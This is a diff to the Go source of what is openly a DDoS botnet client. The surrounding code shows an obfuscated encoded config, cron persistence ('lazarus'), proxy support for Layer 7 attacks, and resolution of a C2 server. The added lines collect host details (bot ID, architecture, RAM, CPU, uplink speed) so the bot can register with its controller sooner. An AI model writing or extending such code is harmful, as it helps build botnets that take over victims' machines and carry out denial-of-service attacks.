@@ -20,7 +20,7 @@ import (
 var debugMode = false
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "mVEeQIl7VoV3hBLFSSnBCfnUrKRcQpXXnbDcWBM=" //change me run setup.py
+const gothTits = "mVEeQIl7VoV3hBLEEFnBCfnUrKRcQpXXnbDcWBM=" //change me run setup.py
 const cryptSeed = "1feb8ca2"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
@@ -67,6 +67,14 @@ var (
 	// Proxy support for L7 attacks (pre-validated by CNC)
 	proxyList      []string
 	proxyListMutex sync.RWMutex
+
+	// Pre-cached bot metadata (computed once in main before connecting)
+	cachedBotID  string
+	cachedArch   string
+	cachedRAM    int64
+	cachedCPU    int
+	cachedProc   string
+	cachedUplink float64
 )
 
 // equationGroup defines the buffer size for various operations (256 bytes)
@@ -247,6 +255,16 @@ func main() {
 	deoxys("main: Running persistence check (lazarus -> cron)...")
 	lazarus()
 	deoxys("main: lazarus persistence check complete")
+	// Pre-compute bot metadata BEFORE connecting so REGISTER is instant.
+	cachedBotID = mustangPanda()
+	cachedArch = charmingKitten()
+	cachedRAM = revilMem()
+	cachedCPU = revilCPU()
+	cachedProc = revilProc()
+	cachedUplink = revilUplinkCached()
+	deoxys("main: Pre-cached metadata — ID:%s Arch:%s RAM:%dMB CPU:%d Proc:%s Uplink:%.2fMbps",
+		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
+
 	deoxys("main: Resolving C2 address...")
 	c2Address := dialga()
 	if c2Address == "" {
